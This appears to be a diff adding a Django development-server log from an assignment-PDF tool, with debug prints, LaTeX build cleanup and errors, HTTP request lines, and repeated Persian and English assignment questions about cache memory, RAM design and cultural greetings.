+2- چرا مردم می‌پرسند "سلام، خوبید؟" و این پرسش چگونه در فرهنگ‌های مختلف متفاوت است؟»
+hear we are {'is_selected_for_assignment': False} It looks like you forgot to include the question text. Please provide the assignment question, and I will be happy to assist you with anonymizing and formatting it.
+hear we are {'is_selected_for_assignment': False} It looks like you forgot to include the question text. Please provide the assignment question, and I will be happy to assist you with anonymizing and formatting it.
+Removed: latex/assignment_pdf.pdf
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+30
+30
+hear we are {'is_selected_for_assignment': True} چگونه فرهنگ‌های مختلف در مراسم احوالپرسی با یکدیگر تفاوت دارند و این تفاوت‌ها چه تأثیری بر روابط اجتماعی دارد؟ چرا مردم می‌پرسند: «سلام، خوبید؟» و این سؤال در فرهنگ‌های مختلف چگونه متفاوت است؟
+hear we are {'is_selected_for_assignment': True} با توجه به درخواست شما، اینجا نسخه ویرایش شده سوال تکلیف شما بدون هیچ گونه اطلاعات شخصی است:
+
+«1- تنوع فرهنگی در آداب و رسوم خوشامدگویی را بررسی کنید و تاثیر آن را بر روابط اجتماعی مورد تحلیل قرار دهید.
+
+2- چرا مردم می‌پرسند "سلام، خوبید؟" و این پرسش چگونه در فرهنگ‌های مختلف متفاوت است؟»
+Removed: latex/nohup.out
+Removed: latex/assignment_pdf.pdf
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+30
+30
+پیش‌بینی روندهای آینده در طراحی و معماری RAM و ارائه ایده‌های نوین برای بهبود عملکرد، کارایی انرژی و قابلیت مقیاس‌پذیری.
+
+۱- بررسی چالش‌ها و موانعی که در مسیر طراحی RAM برای نسل بعدی کامپیوترها وجود دارد.
+۲- شناسایی فرصت‌ها و راهکارهایی برای بهبود عملکرد و کارایی انرژی RAM.
+۳- ارائه ایده‌ها و راهبردهایی برای ارتقای قابلیت مقیاس‌پذیری طراحی RAM.
+
+هدف از این تکلیف، ترسیم چشم‌اندازی از آینده طراحی RAM و کشف راهکارهایی برای غلبه بر چالش‌های موجود در مسیر پیشرفت نسل بعدی کامپیوترها است.
+Removed: latex/assignment_pdf.pdf
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+Removed: latex/assignment_pdf.pdf
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+Watching for file changes with StatReloader
+/usr/lib/python3/dist-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (2.2.1) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+Watching for file changes with StatReloader
+/usr/lib/python3/dist-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (2.2.1) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+[15/Jun/2024 07:11:54] "GET /admin/ HTTP/1.1" 200 9855
+[15/Jun/2024 07:18:48] "OPTIONS /auth/jwt/create/ HTTP/1.1" 200 0
+[15/Jun/2024 07:18:49] "POST /auth/jwt/create/ HTTP/1.1" 200 483
+[15/Jun/2024 07:18:51] "OPTIONS /api/courses/ HTTP/1.1" 200 0
+[15/Jun/2024 07:18:51] "OPTIONS /api/assignments/ HTTP/1.1" 200 0
+[15/Jun/2024 07:18:51] "OPTIONS /api/assignments/ HTTP/1.1" 200 0
+[15/Jun/2024 07:18:51] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 07:18:51] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 07:18:52] "OPTIONS /api/courses/ HTTP/1.1" 200 0
+[15/Jun/2024 07:18:52] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 07:19:00] "OPTIONS /api/questions/sorted/4/ HTTP/1.1" 200 0
+[15/Jun/2024 07:19:00] "OPTIONS /api/questions/sorted/4/ HTTP/1.1" 200 0
+[15/Jun/2024 07:19:01] "GET /api/questions/sorted/4/ HTTP/1.1" 200 1270
+[15/Jun/2024 07:19:01] "GET /api/questions/sorted/4/ HTTP/1.1" 200 1270
+[15/Jun/2024 07:19:06] "OPTIONS /generate_pdf/ HTTP/1.1" 200 0
+[15/Jun/2024 07:19:06] "OPTIONS /generate_pdf/ HTTP/1.1" 200 0
+[15/Jun/2024 07:19:06] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 07:19:06] "POST /generate_pdf/ HTTP/1.1" 200 41
+[15/Jun/2024 07:19:06] "POST /generate_pdf/ HTTP/1.1" 200 41
+[15/Jun/2024 07:21:50] "POST /generate_pdf/ HTTP/1.1" 200 41
+[15/Jun/2024 07:22:00] "POST /generate_pdf/ HTTP/1.1" 200 41
+Watching for file changes with StatReloader
+/usr/lib/python3/dist-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (2.2.1) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+[15/Jun/2024 08:19:48] "POST /auth/jwt/create/ HTTP/1.1" 200 483
+[15/Jun/2024 08:19:50] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:19:51] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:19:51] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:19:51] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:20:03] "GET /api/questions/sorted/4/ HTTP/1.1" 200 1756
+[15/Jun/2024 08:20:04] "GET /api/questions/sorted/4/ HTTP/1.1" 200 1756
+[15/Jun/2024 08:20:07] "PATCH /api/questions/10/ HTTP/1.1" 200 1268
+[15/Jun/2024 08:20:09] "POST /generate_pdf/ HTTP/1.1" 200 41
+[15/Jun/2024 08:23:27] "POST /auth/jwt/create/ HTTP/1.1" 200 483
+[15/Jun/2024 08:23:29] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:23:29] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:23:30] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:23:30] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:23:55] "GET /api/questions/sorted/4/ HTTP/1.1" 200 1755
+[15/Jun/2024 08:23:56] "GET /api/questions/sorted/4/ HTTP/1.1" 200 1755
+[15/Jun/2024 08:23:57] "POST /generate_pdf/ HTTP/1.1" 200 41
+[15/Jun/2024 08:24:37] "PATCH /api/questions/10/ HTTP/1.1" 200 1269
+[15/Jun/2024 08:24:39] "PATCH /api/questions/10/ HTTP/1.1" 200 1269
+[15/Jun/2024 08:24:43] "POST /generate_pdf/ HTTP/1.1" 200 41
+[15/Jun/2024 08:24:50] "PATCH /api/questions/10/ HTTP/1.1" 200 1269
+[15/Jun/2024 08:24:55] "PATCH /api/questions/10/ HTTP/1.1" 200 1269
+[15/Jun/2024 08:25:01] "POST /generate_pdf/ HTTP/1.1" 200 41
+[15/Jun/2024 08:25:54] "PATCH /api/questions/10/ HTTP/1.1" 200 1269
+Performing system checks...
+
+System check identified no issues (0 silenced).
+June 15, 2024 - 08:19:27
+Django version 5.0.6, using settings 'backend.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+hear we are {'is_selected_for_assignment': True} [NAME]،
+
+در زیر چند سوال در مورد کش در حافظه وجود دارد:
+
+1. کش چیست و در مدیریت حافظه چه نقشی ایفا می کند؟
+2. انواع مختلف کش ها را توضیح دهید و مثالی از هر کدام ارائه کنید.
+3. معیارهای طراحی یک کش کارآمد چیست؟ مثالی از استراتژی های جایگزینی صفحه ارائه دهید.
+4. اگر یک برنامه به طور مکرر به یک بلوک حافظه خاص مراجعه کند، عملکرد یک سیستم کش چگونه خواهد بود؟
+5. در مورد همگام سازی کش در یک محیط چند پردازشی توضیح دهید. چالش های احتمالی و راهکارهای آن چیست؟
+
+لطفاً پاسخ خود را با جزئیات فنی مناسب ارائه دهید و از نمودارها یا کدهایی که ممکن است مفید باشند استفاده کنید.
+
+با تشکر،
+[NAME]
+Removed: latex/assignment_pdf.pdf
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+2
+An error occurred: 'utf-8' codec can't decode byte 0xd8 in position 11255: invalid continuation byte
+Removed: latex/assignment_pdf.aux
+Removed: latex/assignment_pdf.fls
+Removed: latex/assignment_pdf.fdb_latexmk
+Removed: latex/assignment_pdf.log
+Removed: latex/nohup.out
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+2
+An error occurred: 'utf-8' codec can't decode byte 0xd8 in position 11255: invalid continuation byte
+hear we are {'is_selected_for_assignment': False} [NAME]،
+
+در زیر چند سوال در مورد کش در حافظه وجود دارد:
+
+1. کش چیست و در مدیریت حافظه چه نقشی ایفا می کند؟
+2. انواع مختلف کش ها را توضیح دهید و مثالی از هر کدام ارائه کنید.
+3. معیارهای طراحی یک کش کارآمد چیست؟ مثالی از استراتژی های جایگزینی صفحه ارائه دهید.
+4. اگر یک برنامه به طور مکرر به یک بلوک حافظه خاص مراجعه کند، عملکرد یک سیستم کش چگونه خواهد بود؟
+5. در مورد همگام سازی کش در یک محیط چند پردازشی توضیح دهید. چالش های احتمالی و راهکارهای آن چیست؟
+
+لطفاً پاسخ خود را با جزئیات فنی مناسب ارائه دهید و از نمودارها یا کدهایی که ممکن است مفید باشند استفاده کنید.
+
+با تشکر،
+[NAME]
+hear we are {'is_selected_for_assignment': False} [NAME]،
+
+در زیر چند سوال در مورد کش در حافظه وجود دارد:
+
+1. کش چیست و در مدیریت حافظه چه نقشی ایفا می کند؟
+2. انواع مختلف کش ها را توضیح دهید و مثالی از هر کدام ارائه کنید.
+3. معیارهای طراحی یک کش کارآمد چیست؟ مثالی از استراتژی های جایگزینی صفحه ارائه دهید.
+4. اگر یک برنامه به طور مکرر به یک بلوک حافظه خاص مراجعه کند، عملکرد یک سیستم کش چگونه خواهد بود؟
+5. در مورد همگام سازی کش در یک محیط چند پردازشی توضیح دهید. چالش های احتمالی و راهکارهای آن چیست؟
+
+لطفاً پاسخ خود را با جزئیات فنی مناسب ارائه دهید و از نمودارها یا کدهایی که ممکن است مفید باشند استفاده کنید.
+
+با تشکر،
+[NAME]
+Removed: latex/assignment_pdf.aux
+Removed: latex/assignment_pdf.fls
+Removed: latex/assignment_pdf.fdb_latexmk
+Removed: latex/assignment_pdf.log
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+2
+hear we are {'is_selected_for_assignment': False} [NAME]،
+
+در زیر چند سوال در مورد کش در حافظه وجود دارد:
+
+1. کش چیست و در مدیریت حافظه چه نقشی ایفا می کند؟
+2. انواع مختلف کش ها را توضیح دهید و مثالی از هر کدام ارائه کنید.
+3. معیارهای طراحی یک کش کارآمد چیست؟ مثالی از استراتژی های جایگزینی صفحه ارائه دهید.
+4. اگر یک برنامه به طور مکرر به یک بلوک حافظه خاص مراجعه کند، عملکرد یک سیستم کش چگونه خواهد بود؟
+5. در مورد همگام سازی کش در یک محیط چند پردازشی توضیح دهید. چالش های احتمالی و راهکارهای آن چیست؟
+
+لطفاً پاسخ خود را با جزئیات فنی مناسب ارائه دهید و از نمودارها یا کدهایی که ممکن است مفید باشند استفاده کنید.
+
+با تشکر،
+[NAME]
+hear we are {'is_selected_for_assignment': False} [NAME]،
+
+در زیر چند سوال در مورد کش در حافظه وجود دارد:
+
+1. کش چیست و در مدیریت حافظه چه نقشی ایفا می کند؟
+2. انواع مختلف کش ها را توضیح دهید و مثالی از هر کدام ارائه کنید.
+3. معیارهای طراحی یک کش کارآمد چیست؟ مثالی از استراتژی های جایگزینی صفحه ارائه دهید.
+4. اگر یک برنامه به طور مکرر به یک بلوک حافظه خاص مراجعه کند، عملکرد یک سیستم کش چگونه خواهد بود؟
+5. در مورد همگام سازی کش در یک محیط چند پردازشی توضیح دهید. چالش های احتمالی و راهکارهای آن چیست؟
+
+لطفاً پاسخ خود را با جزئیات فنی مناسب ارائه دهید و از نمودارها یا کدهایی که ممکن است مفید باشند استفاده کنید.
+
+با تشکر،
+[NAME]
+Removed: latex/assignment_pdf.pdf
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+2
+hear we are {'is_selected_for_assignment': False} [NAME]،
+
+در زیر چند سوال در مورد کش در حافظه وجود دارد:
+
+1. کش چیست و در مدیریت حافظه چه نقشی ایفا می کند؟
+2. انواع مختلف کش ها را توضیح دهید و مثالی از هر کدام ارائه کنید.
+3. معیارهای طراحی یک کش کارآمد چیست؟ مثالی از استراتژی های جایگزینی صفحه ارائه دهید.
+4. اگر یک برنامه به طور مکرر به یک بلوک حافظه خاص مراجعه کند، عملکرد یک سیستم کش چگونه خواهد بود؟
+5. در مورد همگام سازی کش در یک محیط چند پردازشی توضیح دهید. چالش های احتمالی و راهکارهای آن چیست؟
+
+لطفاً پاسخ خود را با جزئیات فنی مناسب ارائه دهید و از نمودارها یا کدهایی که ممکن است مفید باشند استفاده کنید.
+
+با تشکر،
+[NAME]
+hear we are {'is_selected_for_assignment': False} [15/Jun/2024 08:25:54] "PATCH /api/questions/10/ HTTP/1.1" 200 1269
+[15/Jun/2024 08:25:57] "POST /generate_pdf/ HTTP/1.1" 200 41
+Watching for file changes with StatReloader
+/usr/lib/python3/dist-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (2.2.1) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+[15/Jun/2024 08:37:59] "POST /auth/jwt/create/ HTTP/1.1" 200 483
+[15/Jun/2024 08:38:01] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:38:01] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:38:02] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:38:02] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:38:08] "OPTIONS /api/brainstorms/?assignment_id=4 HTTP/1.1" 200 0
+[15/Jun/2024 08:38:08] "GET /api/brainstorms/?assignment_id=4 HTTP/1.1" 200 3738
+[15/Jun/2024 08:38:09] "OPTIONS /api/brainstorms/?assignment_id=4 HTTP/1.1" 200 0
+[15/Jun/2024 08:38:09] "GET /api/brainstorms/?assignment_id=4 HTTP/1.1" 200 3738
+[15/Jun/2024 08:38:49] "OPTIONS /api/brainstorms/ HTTP/1.1" 200 0
+[15/Jun/2024 08:38:55] "POST /api/brainstorms/ HTTP/1.1" 201 183
+[15/Jun/2024 08:38:56] "GET /api/brainstorms/?assignment_id=4 HTTP/1.1" 200 3922
+[15/Jun/2024 08:39:14] "OPTIONS /api/ideas/?brainstorm_id=31 HTTP/1.1" 200 0
+[15/Jun/2024 08:39:14] "GET /api/ideas/?brainstorm_id=31 HTTP/1.1" 200 1905
+[15/Jun/2024 08:39:14] "OPTIONS /api/ideas/?brainstorm_id=31 HTTP/1.1" 200 0
+[15/Jun/2024 08:39:15] "GET /api/ideas/?brainstorm_id=31 HTTP/1.1" 200 1905
+[15/Jun/2024 08:39:41] "POST /api/questions/ HTTP/1.1" 201 1106
+[15/Jun/2024 08:39:41] "GET /api/questions/assignment/4/ HTTP/1.1" 200 2863
+[15/Jun/2024 08:39:42] "GET /api/questions/assignment/4/ HTTP/1.1" 200 2863
+[15/Jun/2024 08:40:26] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:40:26] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:40:27] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:40:27] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:40:29] "GET /api/questions/sorted/4/ HTTP/1.1" 200 2863
+[15/Jun/2024 08:40:29] "GET /api/questions/sorted/4/ HTTP/1.1" 200 2863
+[15/Jun/2024 08:40:33] "POST /generate_pdf/ HTTP/1.1" 200 41
+[15/Jun/2024 08:40:55] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:40:55] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:40:56] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:40:56] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:40:59] "GET /api/questions/assignment/4/ HTTP/1.1" 200 2863
+[15/Jun/2024 08:40:59] "GET /api/questions/assignment/4/ HTTP/1.1" 200 2863
+[15/Jun/2024 08:41:04] "OPTIONS /api/questions/12/ HTTP/1.1" 200 0
+[15/Jun/2024 08:41:04] "OPTIONS /api/questions/12/ HTTP/1.1" 200 0
+[15/Jun/2024 08:41:04] "PATCH /api/questions/12/ HTTP/1.1" 200 1107
+[15/Jun/2024 08:41:05] "OPTIONS /api/questions/12/ HTTP/1.1" 200 0
+[15/Jun/2024 08:41:05] "PATCH /api/questions/12/ HTTP/1.1" 200 1107
+[15/Jun/2024 08:41:05] "PATCH /api/questions/12/ HTTP/1.1" 200 1107
+[15/Jun/2024 08:41:17] "PATCH /api/questions/12/ HTTP/1.1" 200 1107
+Performing system checks...
+
+System check identified no issues (0 silenced).
+June 15, 2024 - 08:36:46
+Django version 5.0.6, using settings 'backend.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+31
+31
+## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+Removed: latex/assignment_pdf.pdf
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+1
+Rc files read:
+  /etc/LatexMk
+Latexmk: This is Latexmk, John Collins, 20 November 2021, version: 4.76.
+Rule 'pdflatex': File changes, etc:
+   Changed files, or newly in use since previous run(s):
+      '/root/Project/Backend/latex/assignment_pdf.tex'
+------------
+Run number 1 of rule 'pdflatex'
+------------
+------------
+Running 'pdflatex  --interaction=nonstopmode -recorder  "/root/Project/Backend/latex/assignment_pdf.tex"'
+------------
+Latexmk: applying rule 'pdflatex'...
+This is pdfTeX, Version 3.141592653-2.6-1.40.22 (TeX Live 2022/dev/Debian) (preloaded format=pdflatex)
+ restricted \write18 enabled.
+entering extended mode
+(/root/Project/Backend/latex/assignment_pdf.tex
+LaTeX2e <2021-11-15> patch level 1
+L3 programming layer <2022-01-21>
+(/usr/share/texlive/texmf-dist/tex/latex/base/article.cls
+Document Class: article 2021/10/04 v1.4n Standard LaTeX document class
+(/usr/share/texlive/texmf-dist/tex/latex/base/size10.clo))
+(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/base/inputenc.sty)
+(/usr/share/texmf/tex/latex/lm/lmodern.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/base/textcomp.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/lastpage/lastpage.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/geometry/geometry.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/ifvtex.sty
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/iftex.sty)))
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/pdftex.def)))
+(/usr/share/texlive/texmf-dist/tex/latex/ragged2e/ragged2e.sty)
+(/usr/share/texmf/tex/latex/lm/t1lmr.fd)
+(/usr/share/texlive/texmf-dist/tex/latex/l3backend/l3backend-pdftex.def)
+(./assignment_pdf.aux)
+*geometry* driver: auto-detecting
+*geometry* detected driver: pdftex
+(/usr/share/texlive/texmf-dist/tex/context/base/mkii/supp-pdf.mkii
+[Loading MPS to PDF converter (version 2006.09.02).]
+) (/usr/share/texlive/texmf-dist/tex/latex/epstopdf-pkg/epstopdf-base.sty
+(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/epstopdf-sys.cfg))
+(/usr/share/texmf/tex/latex/lm/ot1lmr.fd)
+(/usr/share/texmf/tex/latex/lm/omllmm.fd)
+(/usr/share/texmf/tex/latex/lm/omslmsy.fd)
+(/usr/share/texmf/tex/latex/lm/omxlmex.fd)
+! You can't use `macro parameter character #' in vertical mode.
+l.46 #
+      # Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.46 ##
+        Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.48 #
+      ## Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.48 ##
+       # Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.48 ###
+         Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.51 #
+      ## Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.51 ##
+       # Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.51 ###
+         Part 2: Recommendation for High-Performance Computing
+
+AED: lastpage setting LastPage
+[1{/var/lib/texmf/fonts/map/pdftex/updmap/pdftex.map} <./logo.png>]
+(./assignment_pdf.aux)
+
+LaTeX Warning: Label(s) may have changed. Rerun to get cross-references right.
+
+ )
+(see the transcript file for additional information){/usr/share/texmf/fonts/enc
+/dvips/lm/lm-ec.enc}</usr/share/texmf/fonts/type1/public/lm/lmbx10.pfb></usr/sh
+are/texmf/fonts/type1/public/lm/lmbx12.pfb></usr/share/texmf/fonts/type1/public
+/lm/lmr10.pfb></usr/share/texmf/fonts/type1/public/lm/lmr12.pfb>
+Output written on assignment_pdf.pdf (1 page, 111680 bytes).
+Transcript written on assignment_pdf.log.
+Latexmk: References changed.
+Latexmk: Log file says output to 'assignment_pdf.pdf'
+Collected error summary (may duplicate other messages):
+  pdflatex: Command for 'pdflatex' gave return code 1
+      Refer to 'assignment_pdf.log' for details
+Latexmk: Use the -f option to force complete processing,
+ unless error was exceeding maximum runs, or warnings treated as errors.
+Latexmk: Examining 'assignment_pdf.log'
+=== TeX engine is 'pdfTeX'
+Latexmk: Errors, so I did not complete making targets
+
+An error occurred: Command '['latexmk', '--pdf', '--interaction=nonstopmode', '/root/Project/Backend/latex/assignment_pdf.tex']' returned non-zero exit status 12.
+hear we are {'is_selected_for_assignment': False} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are {'is_selected_for_assignment': False} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are {'is_selected_for_assignment': False} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are {'is_selected_for_assignment': False} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are {'is_selected_for_assignment': False} [15/Jun/2024 08:41:28] "PATCH /api/questions/12/ HTTP/1.1" 200 1107
+[15/Jun/2024 08:41:29] "PATCH /api/questions/12/ HTTP/1.1" 200 1107
+[15/Jun/2024 08:41:29] "PATCH /api/questions/12/ HTTP/1.1" 200 1107
+[15/Jun/2024 08:42:00] "PATCH /api/questions/12/ HTTP/1.1" 200 1158
+[15/Jun/2024 08:42:01] "GET /api/questions/assignment/4/ HTTP/1.1" 200 2940
+[15/Jun/2024 08:42:52] "PATCH /api/questions/10/ HTTP/1.1" 200 1268
+[15/Jun/2024 08:42:55] "PATCH /api/questions/10/ HTTP/1.1" 200 1268
+[15/Jun/2024 08:42:57] "PATCH /api/questions/10/ HTTP/1.1" 200 1268
+[15/Jun/2024 08:43:05] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:43:06] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:43:06] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:43:07] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:43:08] "GET /api/questions/sorted/4/ HTTP/1.1" 200 2939
+[15/Jun/2024 08:43:08] "GET /api/questions/sorted/4/ HTTP/1.1" 200 2939
+[15/Jun/2024 08:43:16] "PATCH /api/questions/12/ HTTP/1.1" 200 1157
+[15/Jun/2024 08:43:17] "PATCH /api/questions/10/ HTTP/1.1" 200 1269
+## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are {'is_selected_for_assignment': False} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are {'is_selected_for_assignment': False} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are <QueryDict: {'details_modified': ['## Cache Performance Analysis and Comparison\r\n\r\n### Part 1: Analysis of Cache Performance\r\nAnalyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. \r\n\r\n### Part 2: Recommendation for High-Performance Computing\r\nPresent your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.'], 'attachment': [<InMemoryUploadedFile: SAT_Poster.png (image/png)>]}> ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are {'is_selected_for_assignment': True} [NAME]،
+
+در زیر چند سوال در مورد کش در حافظه وجود دارد:
+
+1. کش چیست و در مدیریت حافظه چه نقشی ایفا می کند؟
+2. انواع مختلف کش ها را توضیح دهید و مثالی از هر کدام ارائه کنید.
+3. معیارهای طراحی یک کش کارآمد چیست؟ مثالی از استراتژی های جایگزینی صفحه ارائه دهید.
+4. اگر یک برنامه به طور مکرر به یک بلوک حافظه خاص مراجعه کند، عملکرد یک سیستم کش چگونه خواهد بود؟
+5. در مورد همگام سازی کش در یک محیط چند پردازشی توضیح دهید. چالش های احتمالی و راهکارهای آن چیست؟
+
+لطفاً پاسخ خود را با جزئیات فنی مناسب ارائه دهید و از نمودارها یا کدهایی که ممکن است مفید باشند استفاده کنید.
+
+با تشکر،
+[NAME]
+hear we are {'is_selected_for_assignment': True} [NAME]،
+
+در زیر چند سوال در مورد کش در حافظه وجود دارد:
+
+1. کش چیست و در مدیریت حافظه چه نقشی ایفا می کند؟
+2. انواع مختلف کش ها را توضیح دهید و مثالی از هر کدام ارائه کنید.
+3. معیارهای طراحی یک کش کارآمد چیست؟ مثالی از استراتژی های جایگزینی صفحه ارائه دهید.
+4. اگر یک برنامه به طور مکرر به یک بلوک حافظه خاص مراجعه کند، عملکرد یک سیستم کش چگونه خواهد بود؟
+5. در مورد همگام سازی کش در یک محیط چند پردازشی توضیح دهید. چالش های احتمالی و راهکارهای آن چیست؟
+
+لطفاً پاسخ خود را با جزئیات فنی مناسب ارائه دهید و از نمودارها یا کدهایی که ممکن است مفید باشند استفاده کنید.
+
+با تشکر،
+[NAME]
+hear we are {'is_selected_for_assignment': True} [NAME]،
+
+در زیر چند سوال در مورد کش در حافظه وجود دارد:
+
+1. کش چیست و در مدیریت حافظه چه نقشی ایفا می کند؟
+2. انواع مختلف کش ها را توضیح دهید و مثالی از هر کدام ارائه کنید.
